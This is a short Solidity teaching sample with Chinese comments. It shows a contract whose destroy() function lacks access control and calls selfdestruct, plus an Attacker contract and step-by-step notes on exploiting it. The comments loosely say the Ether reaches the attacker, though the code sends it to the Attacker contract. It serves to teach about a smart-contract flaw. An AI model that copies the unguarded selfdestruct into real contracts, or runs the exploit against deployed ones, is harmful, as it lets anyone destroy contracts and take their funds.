pragma solidity >=0.8.0;

// 漏洞名稱：Missing verification for program termination
// 描述：此合約中的 destroy 函數缺乏權限檢查，任何人都可以呼叫 destroy 函數，導致合約被 selfdestruct，自毀後合約的 bytecode 會被刪除，且剩餘的以太幣會轉移給攻擊者。

contract XYZ {
    // 漏洞重點：destroy 函數未檢查呼叫者是否有權限，任意使用者均能觸發自毀。
    function destroy() public {
        // 這裡使用 selfdestruct 將合約銷毀，並將所有餘額轉移給 msg.sender（無權限檢查）
        selfdestruct(payable(msg.sender));
    }
}

// 攻擊合約：演示如何利用漏洞觸發自毀
contract Attacker {
    XYZ public vulnerableContract;

    // 在部署攻擊合約時傳入目標合約的地址
    constructor(address _vulnerableContract) {
        vulnerableContract = XYZ(_vulnerableContract);
    }

    // 攻擊步驟：呼叫 vulnerable 合約中的 destroy 函數，讓其自毀
    function attack() external {
        // 由於 destroy 函數未實施存取控制，攻擊者可以隨意呼叫
        vulnerableContract.destroy();
    }
}

/*
部署和攻擊流程說明：
1. 部署 XYZ 合約，此合約含有未授權保護的 destroy 函數。
2. 攻擊者部署 Attacker 合約，並將部署好的 XYZ 合約地址作為參數傳入。
3. 攻擊者呼叫 Attacker 合約的 attack 函數，此函數將呼叫 XYZ 合約的 destroy 函數，使得 XYZ 合約透過 selfdestruct 被摧毀，同時所有 Ether 轉移給攻擊者（呼叫者的地址）。
*/